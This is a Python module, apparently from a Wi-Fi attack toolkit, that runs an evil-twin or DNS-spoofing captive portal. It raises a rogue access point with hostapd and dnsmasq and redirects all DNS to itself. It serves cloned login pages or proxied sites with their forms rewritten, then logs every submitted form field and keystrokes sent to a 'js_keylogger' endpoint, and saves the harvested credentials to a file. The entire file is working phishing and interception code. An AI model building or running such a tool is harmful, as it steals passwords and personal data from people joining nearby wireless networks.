import json
import os
import random
import shutil
import subprocess
import tempfile
import time
from threading import Event, Thread

try:
    from flask import Flask, request, send_from_directory, Response
    import requests
    from bs4 import BeautifulSoup
    FLASK_OK = True
except ImportError:
    FLASK_OK = False

from ..context import Module
from ..dns_spoof import DnsSpoofAlt, DNSLIB_OK
from ..iface import arac_var, txpower_ayarla
from ..firewall import kurallari_ekle, temizle as fw_temizle

TEMPLATES_DIR = "templates"

class PortalModule(Module):
    name = "portal"

    def __init__(self, ctx):
        super().__init__(ctx)
        self.ssid = None
        self.template = None
        self.channel = None
        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.flask_thread = None
        self.flask_app = None
        self.dur = Event()
        self.log_creds = True
        self.creds = []
        self._tmpdir = None
        self._hostapd_conf = None
        self._dnsmasq_conf = None
        self.dns = None
        self.mode = None
        self.proxy_target = None

    def _templates_listesi(self):
        if not os.path.isdir(TEMPLATES_DIR):
            return []
        return [d for d in os.listdir(TEMPLATES_DIR) if os.path.isdir(os.path.join(TEMPLATES_DIR, d))]

    def on(self, ssid=None, template=None, channel=None, *a):
        if self.active:
            return
        if not ssid or not template:
            self.ctx.log("[portal] usage: module portal on <ssid> <template> [ch]", "err")
            return

        tdir = os.path.join(TEMPLATES_DIR, template)
        if not os.path.isfile(os.path.join(tdir, "index.html")):
            self.ctx.log(f"[portal] {tdir}/index.html yok", "err")
            return

        mitm = self.ctx.modules.get("mitm")
        if mitm and mitm.active:
            return self._on_mitm(ssid, tdir, channel)
        return self._on_evil_twin(ssid, tdir, channel)

    def _on_mitm(self, ssid, tdir, channel):
        if not FLASK_OK or not DNSLIB_OK:
            return
        self.ssid = ssid
        self.template = tdir
        self.mode = "mitm"
        self.dur.clear()
        self.active = True
        self.dns = DnsSpoofAlt(self.ctx, self.ctx.iface, spoof_ip="10.0.0.1")
        self.dns.basla()
        self.flask_app = self._flask_olustur()
        self.flask_thread = Thread(target=self._flask_calistir, daemon=True)
        self.flask_thread.start()
        self.ctx.log(f"[portal] MITM ACTIVE ssid={ssid} dns->10.0.0.1", "ok")

    def _on_evil_twin(self, ssid, tdir, channel):
        if not FLASK_OK or not arac_var("hostapd") or not arac_var("dnsmasq"):
            return
        self.ssid = ssid
        self.template = tdir
        self.channel = int(channel) if channel else 6
        self.mode = "evil_twin"
        
        self._tmpdir = tempfile.mkdtemp(prefix="szr-portal-")
        self._hostapd_conf = os.path.join(self._tmpdir, "hostapd.conf")
        self._dnsmasq_conf = os.path.join(self._tmpdir, "dnsmasq.conf")
        self._hostapd_yaz()
        self._dnsmasq_yaz()
        
        subprocess.run(["ip", "addr", "flush", "dev", self.ctx.iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", self.ctx.iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", self.ctx.iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        txpower_ayarla(self.ctx.iface, 30)
        kurallari_ekle(self.ctx.iface)

        self.dur.clear()
        try:
            self.hostapd_proc = subprocess.Popen(["hostapd", self._hostapd_conf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            return
        time.sleep(2)
        if self.hostapd_proc.poll() is not None:
            return
        
        try:
            self.dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", self._dnsmasq_conf, "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            return
        
        self.active = True
        self.flask_app = self._flask_olustur()
        self.flask_thread = Thread(target=self._flask_calistir, daemon=True)
        self.flask_thread.start()
        self.ctx.log(f"[portal] EVIL TWIN ACTIVE ssid={ssid} ch={self.channel}", "ok")

    def _hostapd_yaz(self):
        conf = f"""interface={self.ctx.iface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
wmm_enabled=1
auth_algs=1
"""
        with open(self._hostapd_conf, "w") as f:
            f.write(conf)

    def _dnsmasq_yaz(self):
        conf = f"""interface={self.ctx.iface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
no-resolv
"""
        with open(self._dnsmasq_conf, "w") as f:
            f.write(conf)

    def _flask_olustur(self):
        app = Flask(__name__, static_folder=None)
        tdir = os.path.abspath(self.template)
        creds = self.creds
        log_creds = self.log_creds
        ctx_log = self.ctx.log
        proxy_target = self.proxy_target

        @app.route("/log", methods=["POST"])
        def js_keylogger():
            data = request.get_json(silent=True)
            if data and log_creds:
                creds.append((time.time(), request.remote_addr, {"JS_Keylog": data.get("keys", "")}))
                ctx_log(f"[portal] KEYLOG {request.remote_addr}: {data.get('keys')}", "warn")
            return "OK", 200

        @app.route("/", defaults={"path": ""}, methods=["GET", "POST"])
        @app.route("/<path:path>", methods=["GET", "POST"])
        def catch_all(path):
            time.sleep(random.uniform(1.0, 2.5))
            
            if request.method == "POST":
                if log_creds:
                    data = dict(request.form)
                    creds.append((time.time(), request.remote_addr, data))
                    ctx_log(f"[portal] FORM {request.remote_addr} {data}", "warn")
                return ("<html><body style='text-align:center; margin-top:50px; font-family:sans-serif;'>"
                        "<h2>Teşekkürler</h2><p>Ağa bağlanılıyor, lütfen bekleyin...</p>"
                        "<div class='loader'></div></body></html>", 200)

            if path == "generate_204" or path == "hotspot-detect.html" or path == "connecttest.txt":
                pass
            elif proxy_target:
                try:
                    r = requests.get(f"{proxy_target}/{path}", timeout=3)
                    soup = BeautifulSoup(r.text, "html.parser")
                    for form in soup.find_all("form"):
                        form["action"] = "/"
                    return str(soup)
                except Exception:
                    pass

            index_path = os.path.join(tdir, "index.html")
            if os.path.isfile(index_path):
                with open(index_path, "r", encoding="utf-8") as f:
                    return f.read()
            return "Bulunamadi", 404

        return app

    def _flask_calistir(self):
        try:
            self.flask_app.run(host="0.0.0.0", port=80, debug=False, use_reloader=False, threaded=True)
        except Exception as e:
            self.ctx.log(f"[portal] flask err: {e}", "err")

    def off(self):
        if not self.active:
            return
        self.dur.set()
        if self.dns:
            self.dns.durdur()
            self.dns = None
        for p in (self.hostapd_proc, self.dnsmasq_proc):
            if p and p.poll() is None:
                try:
                    p.terminate()
                except Exception:
                    pass
        if self.mode == "evil_twin":
            fw_temizle(self.ctx.iface)
        self.active = False
        if self._tmpdir and os.path.isdir(self._tmpdir):
            shutil.rmtree(self._tmpdir, ignore_errors=True)
        self.ctx.log(f"[portal] stopped", "ok")

    def save_creds(self, path):
        if not self.creds:
            return
        try:
            with open(path, "w", encoding="utf-8") as f:
                for ts, ip, data in self.creds:
                    f.write(f"{ts}\t{ip}\t{json.dumps(data)}\n")
            self.ctx.log(f"[portal] {len(self.creds)} form -> {path}", "ok")
        except Exception:
            pass

    def status(self):
        if self.active:
            return f"active ({self.mode}) ssid={self.ssid}"
        return "off"
